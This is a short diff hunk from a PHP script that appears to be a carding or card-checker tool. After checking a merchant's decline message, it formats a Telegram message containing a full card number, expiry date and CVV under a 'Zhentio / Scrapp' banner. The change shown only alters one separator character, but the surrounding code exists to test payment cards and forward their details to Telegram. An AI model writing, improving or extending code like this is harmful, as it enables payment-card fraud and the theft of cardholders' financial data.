@@ -731,7 +731,7 @@ if (strpos($Fim, 'We’re sorry. We’re unable to complete') || strpos($Fim, 'L
 
     // --- CONFIGURACIÓN TELEGRAM (ESTILO LOZY) ---
     $bin_cabecera = substr($cc, 0, 6);
-    $texto_telegram = "⌞ Zhentio / Scrapp ⌝| #BIN$bin_cabecera\n";
+    $texto_telegram = "⌞ Zhentio / Scrapp ⌝ #BIN$bin_cabecera\n";
     $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
     $texto_telegram .= "•| Card: <code>$cc|$mes|$ano|$cvv</code>\n";
     $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
